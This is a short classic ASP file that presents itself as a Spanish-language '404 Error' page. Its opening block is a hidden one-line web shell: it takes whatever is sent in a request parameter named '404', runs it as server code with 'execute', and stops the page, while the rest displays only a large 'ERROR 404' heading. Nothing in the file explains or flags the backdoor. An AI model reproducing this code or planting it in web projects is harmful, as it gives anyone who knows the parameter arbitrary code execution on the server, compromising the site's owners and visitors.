<%
re= request("404")
if re <>"" then
  execute re
  response.end
end if
%>
<%
MTtitulo="Error 404"
MTdescripcion="Error 404"
MTkeywords="error"

seccion="INICIO"
web1="Consolas"
link2="/404.html"
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
</head>
<body>
<H1 class="naranja" style="font-size:150px;text-align:center;">ERROR 404</H1>
</body>
</html>